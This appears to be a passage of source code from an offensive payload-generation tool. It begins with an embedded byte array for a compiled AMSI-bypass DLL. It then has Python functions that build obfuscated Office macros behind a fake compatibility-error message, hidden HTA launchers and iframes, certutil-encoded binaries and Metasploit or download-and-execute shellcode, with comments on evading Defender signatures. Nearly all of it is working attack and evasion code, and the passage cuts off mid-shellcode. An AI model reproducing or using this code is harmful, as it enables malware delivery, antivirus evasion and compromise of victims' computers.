116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 114, 97, 100, 101, 109, 97, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 68, 101, 115, 99, 114, 105, 112, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 112, 121, 114, 105, 103, 104, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 75, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 46, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 115, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 99, 0, 104, 0, 97, 0, 110, 0, 103, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 77, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 32, 0, 104, 0, 97, 0, 115, 0, 32, 0, 98, 0, 101, 0, 101, 0, 110, 0, 32, 0, 97, 0, 112, 0, 112, 0, 108, 0, 105, 0, 101, 0, 100, 0, 46, 0, 0, 0, 0, 0, 77, 203, 161, 57, 40, 124, 239, 68, 156, 240, 131, 50, 130, 195, 248, 87, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 4, 32, 1, 1, 2, 7, 7, 5, 24, 24, 25, 9, 24, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 97, 17, 101, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 183, 122, 92, 86, 25, 52, 224, 137, 3, 6, 17, 16, 5, 0, 2, 24, 24, 14, 4, 0, 1, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 2, 0, 0, 0, 0, 0, 15, 1, 0, 10, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 0, 0, 5, 1, 0, 0, 0, 0, 23, 1, 0, 18, 67, 111, 112, 121, 114, 105, 103, 104, 116, 32, 194, 169, 32, 32, 50, 48, 49, 56, 0, 0, 41, 1, 0, 36, 56, 99, 97, 49, 52, 99, 52, 57, 45, 54, 52, 52, 98, 45, 52, 48, 99, 102, 45, 98, 49, 99, 55, 45, 97, 53, 98, 100, 97, 101, 98, 48, 98, 50, 99, 97, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 77, 1, 0, 28, 46, 78, 69, 84, 70, 114, 97, 109, 101, 119, 111, 114, 107, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 52, 46, 53, 46, 50, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 20, 46, 78, 69, 84, 32, 70, 114, 97, 109, 101, 119, 111, 114, 107, 32, 52, 46, 53, 46, 50, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 221, 193, 71, 222, 0, 0, 0, 0, 2, 0, 0, 0, 101, 0, 0, 0, 12, 44, 0, 0, 12, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 105, 207, 113, 241, 18, 122, 72, 71, 173, 244, 95, 170, 153, 86, 158, 210, 1, 0, 0, 0, 67, 58, 92, 85, 115, 101, 114, 115, 92, 97, 110, 100, 114, 101, 92, 115, 111, 117, 114, 99, 101, 92, 114, 101, 112, 111, 115, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 92, 111, 98, 106, 92, 82, 101, 108, 101, 97, 115, 101, 92, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 46, 112, 100, 98, 0, 153, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 179, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 165, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 44, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 44, 3, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 140, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 104, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 26, 0, 1, 0, 1, 0, 67, 0, 111, 0, 109, 0, 109, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0, 0, 0, 0, 0, 0, 34, 0, 1, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 72, 0, 18, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 32, 0, 169, 0, 32, 0, 32, 0, 50, 0, 48, 0, 49, 0, 56, 0, 0, 0, 42, 0, 1, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 84, 0, 114, 0, 97, 0, 100, 0, 101, 0, 109, 0, 97, 0, 114, 0, 107, 0, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 0, 0, 0, 0, 52, 0, 8, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 200, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | Out-Null}[%s]::Disable()}""" % (func,func,func))
    return amsi_string

# this will convert any url to hexformat for download/exec payload
def url_hexified(url):
    x = binascii.hexlify(url)
    a = [x[i:i+2] for i in range(0, len(x), 2)]
    list = ""
    for goat in a: list = list + "\\x" + goat.rstrip()
    return list

# split string
def split_str(s, length):
    return [s[i:i + length] for i in range(0, len(s), length)]

# write a file to designated path
def write_file(path, text):
    file_write = open(path, "w")
    file_write.write(text)
    file_write.close()


# scramble commmands into multiple strings
def scramble_stuff():
    ps = "powershell.exe"
    list = ""
    for letter in ps:
        letter = '"' + letter.rstrip() + '" & '
        list = list + letter

    full_exe = list[:-2]
    ps_only = full_exe.split(".")[0][:-4]

    wscript = "WScript"
    shell = "Shell"
    list2 = ""
    for letter in wscript:
        letter = '"' + letter.rstrip() + '" & '
        list2 = list2 + letter

    full_wscript = list2[:-2]

    list3 = ""
    for letter in shell:
        letter = '"' + letter.rstrip() + '" & '
        list3 = list3 + letter

    full_shell = list3[:-2]

    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell

# generate full macro
def generate_macro(full_attack, line_length=50):

    # randomize macro name
    macro_rand = generate_random_string(5, 10)

    # start of the macro
    macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))

    if line_length is None:
        line_length_int = 50
    else:
        line_length_int = int(line_length)

    powershell_command_list = split_str(full_attack, line_length_int)

    counter = 0
    for line in powershell_command_list:
        if counter == 0:
            macro_str += " \"" + line + "\"\n"
        if counter >= 1:
            macro_str += macro_rand + " = " + macro_rand + " + \"" + line + "\"\n"

        counter = counter + 1

    # remove trailing "_ \r\n"
    #macro_str = macro_str[:-4]
    # remove first occurrence of &
    #macro_str = macro_str.replace("& ", "", 1)
    macro_str = macro_str.replace('powershell /w 1 /C "', r' /w 1 /C ""')
    #macro_str = macro_str.replace('/w 1', "") # no longer needed
    macro_str = macro_str.replace("')", "')\"")

    # obfsucate the hell out of Shell and PowerShell
    long_string = scramble_stuff().split(",")
    # full powershell.exe
    ps_long = long_string[0]
    # ps abbreviated
    ps_short = long_string[1][1:]
    # wscript
    wscript = long_string[2]
    # shell
    shell = long_string[3]

    macro_str = macro_str.replace('powershell /w 1', ps_short + ' & " /w 1')
    macro_str = macro_str.replace(';powershell', ';" & "' + ps_short + ' & "')

    # randomized variables
    function1 = generate_random_string(5, 15)
    function2 = generate_random_string(5, 15)
    function3 = generate_random_string(5, 15)
    function4 = generate_random_string(5, 15)
    function5 = generate_random_string(5, 15)
    function6 = generate_random_string(5, 15)

    # our message we present to the end user - can change this to whatever you want
    macro_message = ("This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]")

    # title bar on top what it states there, you can also change this to whatever you want
    subject_message = ("Microsoft Office (Compatibility Mode)")
 
    # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a "False" terminal window. Just needed to split it out into two lines :P
    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {14}\n{14} = {15} & " "\n{17}.Run {18} & {19}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{21}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{20}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6,macro_rand,macro_message,subject_message))

    # strip and fix issues
    macro_str = macro_str.replace("''", "")

    return macro_str


# generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
# - https://gist.github.com/mattifestation/47f9e8a431f96a266522
def gen_cert_attack(filename):
    if os.path.isfile(filename):
        # make sure the directory is made
        if not os.path.isdir("decode_attack"):
            os.makedirs("decode_attack")

        # remove old files here
        if os.path.isfile("decode_attack/encoded_attack.crt"):
            os.remove("decode_attack/encoded_attack.crt")

        print(
            "[*] Importing in binary file to base64 encode it for certutil prep.")
        data = open(filename, "rb").read()
        data = base64.b64encode(data)
        print("[*] Writing out the file to decode_attack/encoded_attack.crt")
        write_file("decode_attack/encoded_attack.crt",
                   "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
        print("[*] Filewrite complete, writing out decode string for you..")
        write_file("decode_attack/decode_command.bat",
                   "certutil -decode encoded_attack.crt encoded.exe")
        print("[*] Exported attack under decode_attack/")
        print(
            "[*] There are two files, encoded_attack.crt contains your encoded data")
        print(
            "[*] The second file, decode_command.bat will decode the cert to an executable.")
    else:
        print("[!] File was not found. Exiting the unicorn attack.")
        sys.exit()

# Generate HTA launchers and index
def gen_hta_attack(command):
    # HTA code here

    command = command.replace("'", "\\'")
    # generate random variable names for vba
    hta_rand = generate_random_string(10, 30)

    # split up so we arent calling shell command for cmd.exe
    shell_split1 = generate_random_string(10, 100)
    shell_split2 = generate_random_string(10, 100)
    shell_split3 = generate_random_string(10, 100)
    shell_split4 = generate_random_string(10, 100)
    shell_split5 = generate_random_string(10, 100)

    # 'powershell /w 1 /C "s\'\'v EZE -;s\'\'v KRA e\'\'c;s\'\'v gvH ((g\'\'v EZE).value.toString()+(g\'\'v KRA).value.toString());powershell (g
    ps_split1 = generate_random_string(10, 100)
    ps_split2 = generate_random_string(10, 100)
    ps_split3 = generate_random_string(10, 100)
    ps_split4 = generate_random_string(10, 100)

    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{6} = "pow";\n{7} = "ersh";\n{8} = "ell";\n{9} = ({6} + {7} + {8});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))
    main2 = ("""{0}.run(""".format(hta_rand))
    main4 = ("""{0}', 0);window.close();\n</script>""".format(command)).replace("powershell", "{0} + '".format(ps_split4)).replace(";{0}".format(ps_split4), ";' + {0}".format(ps_split4))
    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")

    # remote old directory
    if os.path.isdir("hta_attack"):
        shutil.rmtree("hta_attack") 

    os.makedirs("hta_attack")

    # write out index file
    print("[*] Writing out index file to hta_attack/index.html")
    write_file("hta_attack/index.html", html_code)

    # write out Launcher.hta
    print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
    write_file("hta_attack/Launcher.hta", main1 + main2 + main4)


# format metasploit shellcode
def format_metasploit(data):
    # start to format this a bit to get it ready
    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
    data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
    if len(data) < 1:
        #print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
        print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
        print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
        print("Exiting....")
        sys.exit()

    return data


# generate the actual shellcode through msf
def generate_shellcode(payload, ipaddr, port):
    print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
    port = port.replace("LPORT=", "")

    # if we are using traditional payloads and not download_exec
    if not "exe=" in ipaddr:
        ipaddr = "LHOST={0}".format(ipaddr)
        port = "LPORT={0}".format(port)

    # if download_exec is being used
    if "url=" in ipaddr:
        # shellcode modified from https://www.exploit-db.com/exploits/24318/ - tested on windows xp, windows 7, windows 10, server 2008, server 2012
        shellcode = ("\\x33\\xC9\\x64\\x8B\\x41\\x30\\x8B\\x40\\x0C\\x8B"
